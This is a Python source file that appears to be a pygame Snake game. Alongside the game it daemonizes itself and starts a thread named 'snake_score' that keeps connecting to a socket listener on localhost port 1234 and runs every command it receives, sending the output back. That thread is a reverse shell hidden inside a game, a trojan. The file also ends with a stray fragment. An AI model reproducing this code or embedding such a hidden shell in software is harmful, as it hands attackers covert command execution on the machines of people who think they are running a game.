import socket
import subprocess
import os
import sys
import time
import pygame
import random
import threading

def daemonize():

	if os.fork():
		sys.exit()
	os.setsid()
	if os.fork():
		sys.exit()
	sys.stdout = open('/dev/null', 'w')
	sys.stderr = open('/dev/null', 'w')
	sys.stdin = open('/dev/null', 'r')

def snake_game():
	pygame.init()

	white = (255, 255, 255)
	yellow = (255, 255, 102)
	black = (0, 0, 0)
	red = (213, 50, 80)
	green = (0, 255, 0)
	blue = (50, 153, 213)

	dis_width = 600
	dis_height = 400

	dis = pygame.display.set_mode((dis_width, dis_height))
	pygame.display.set_caption('Snake Game')

	clock = pygame.time.Clock()

	snake_block = 10
	snake_speed = 15

	font_style = pygame.font.SysFont("bahnschrift", 25)
	score_font = pygame.font.SysFont("comicsansms", 35)

	def your_score(score):
		value = score_font.render("Your Score: " + str(score), True, black)
		dis.blit(value, [0, 0])

	def our_snake(snake_block, snake_list):
		for x in snake_list:
			pygame.draw.rect(dis, green, [x[0], x[1], snake_block, snake_block])

	def message(msg, color):
		mesg = font_style.render(msg, True, color)
		dis.blit(mesg, [dis_width / 6, dis_height / 3])

	game_over = False
	game_close = False

	x1 = dis_width / 2
	y1 = dis_height / 2

	x1_change = 0
	y1_change = 0

	snake_List = []
	Length_of_snake = 1

	foodx = round(random.randrange(0, dis_width - snake_block) / 10.0) * 10.0
	foody = round(random.randrange(0, dis_height - snake_block) / 10.0) * 10.0

	while not game_over:

		while game_close:
			dis.fill(blue)
			message("You Lost! Press Q-Quit or C-Play Again", red)
			your_score(Length_of_snake - 1)
			pygame.display.update()

			for event in pygame.event.get():
				if event.type == pygame.KEYDOWN:
					if event.key == pygame.K_q:
						game_over = True
						game_close = False
					if event.key == pygame.K_c:
						snake_game()

		for event in pygame.event.get():
			if event.type == pygame.QUIT:
				game_over = True
			if event.type == pygame.KEYDOWN:
				if event.key == pygame.K_LEFT:
					x1_change = -snake_block
					y1_change = 0
				elif event.key == pygame.K_RIGHT:
					x1_change = snake_block
					y1_change = 0
				elif event.key == pygame.K_UP:
					y1_change = -snake_block
					x1_change = 0
				elif event.key == pygame.K_DOWN:
					y1_change = snake_block
					x1_change = 0

		if x1 >= dis_width or x1 < 0 or y1 >= dis_height or y1 < 0:
			game_close = True
		x1 += x1_change
		y1 += y1_change
		dis.fill(blue)
		pygame.draw.rect(dis, yellow, [foodx, foody, snake_block, snake_block])
		snake_Head = []
		snake_Head.append(x1)
		snake_Head.append(y1)
		snake_List.append(snake_Head)
		if len(snake_List) > Length_of_snake:
			del snake_List[0]

		for x in snake_List[:-1]:
			if x == snake_Head:
				game_close = True

		our_snake(snake_block, snake_List)
		your_score(Length_of_snake - 1)

		pygame.display.update()

		if x1 == foodx and y1 == foody:
			foodx = round(random.randrange(0, dis_width - snake_block) / 10.0) * 10.0
			foody = round(random.randrange(0, dis_height - snake_block) / 10.0) * 10.0
			Length_of_snake += 1

		clock.tick(snake_speed)

	pygame.quit()
	quit()


def snake_score():
	host = "localhost"
	port = 1234

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	res = sock.connect_ex((host, port))
	i = 0
	while res != 0:
		time.sleep(3)
		res = sock.connect_ex((host, port))
	if res != 0:
		exit()

	sock.send(f"\n{subprocess.getoutput('pwd')}_$>".encode())
	while True:
		command = sock.recv(1024).decode()
		if command.lower()[:4] == "exit":
			break
		pwd = subprocess.getoutput('pwd')
		if command.startswith("cd "):
			try:
				os.chdir(command.strip('cd ').strip())
				sock.send(f"{subprocess.getoutput('pwd')}_$>".encode())
			except FileNotFoundError:
				sock.send(f"Directory not found\n{pwd}_$>".encode())
		else:	
			output = subprocess.getoutput(command) + f"\n{pwd}_$>"
			sock.send(output.encode())
	sock.close()

if __name__ == "__main__":

	daemonize()

	t1 = threading.Thread(target=snake_score)
	t2 = threading.Thread(target=snake_game)

	t1.start()
	t2.start()

	t1.join()
	t2.join()

	det
